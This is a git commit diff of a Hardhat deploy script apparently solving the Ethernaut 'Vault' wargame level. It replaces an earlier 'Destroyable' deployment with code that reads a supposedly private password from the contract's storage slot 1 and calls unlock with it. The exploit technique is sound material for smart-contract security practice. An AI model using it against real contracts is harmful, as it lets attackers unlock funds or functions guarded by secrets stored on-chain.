058fc15456aba9c9144b5c60d9f137185309d6e9
0xShoto <steve.puget@gmail.com>
2022-01-03 20:16:07 +0100

    First commit

--- scripts/deploy.ts
+++ scripts/deploy.ts
@@ -4,9 +4,17 @@ const ETHERNAUT_ADDRESS = "";
 
 async function main() {
   // Get, destroy and send to the Ethernaut contract
-  const Destroyable = await ethers.getContractFactory("Destroyable");
-  const destroyable = await Destroyable.deploy(ETHERNAUT_ADDRESS, { value: ethers.utils.parseEther("0.0001") });
-  console.log("Deploy Destroyable contract at", destroyable.address);
+  const Vault = await ethers.getContractFactory("Vault");
+  const vault = await Vault.attach(ETHERNAUT_ADDRESS);
+  console.log("Attach Vault contract at", vault.address);
+
+  // Get the password in the storage of the contract
+  const password = await ethers.provider.getStorageAt(ETHERNAUT_ADDRESS, 1);
+
+  // Unlock the contract
+  const tx = await vault.unlock(password);
+  await tx.wait();
+  console.log("Tx hash:", tx.hash);
 }
 
 main().catch((error) => {
